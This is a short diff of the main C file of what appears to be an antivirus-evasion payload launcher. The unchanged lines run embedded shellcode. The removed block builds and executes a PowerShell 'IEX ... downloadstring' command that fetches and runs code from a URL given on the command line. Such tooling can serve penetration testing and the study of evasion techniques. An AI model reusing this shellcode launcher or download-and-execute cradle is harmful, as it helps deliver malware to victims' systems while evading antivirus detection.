@@ -63,19 +63,6 @@ int main (int argc, char **argv)
 	// buf is defined in defs.h by make_avet and contains the shellcode	
 	bind_shellcode(shellcode);
 	
-
-//#if defined(DOWNLOADPOWERSHELL)
-//download a file and write to disk
-
-#ifdef DOWNLOADPOWERSHELL
-	char download[500];
-	sprintf(download,"powershell.exe \"IEX ((new-object net.webclient).downloadstring('%s'))\"",argv[2]);
-	#ifdef PRINT_DEBUG
-		printf("url: %s\n", download);
-	#endif
-	system(download);
-#endif		
-
 	return 0;
 }
 
